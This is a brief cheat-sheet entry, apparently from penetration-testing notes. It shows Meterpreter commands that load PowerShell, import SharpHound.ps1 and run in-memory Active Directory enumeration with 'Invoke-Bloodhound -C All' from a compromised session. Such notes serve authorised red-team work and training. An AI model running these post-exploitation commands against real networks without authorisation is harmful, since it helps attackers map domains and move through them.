## Some Useful Meterpreter Modules/Functions

**Load PS1 and Execute in Memory**

```bash
meterpreter > load powershell

meterpreter > powershell_import ../Tools/AD_Enum/SharpHound.ps1
# May need to cd to a writeable directory first
meterpreter > powershell_execute 'Invoke-Bloodhound -C All'
```
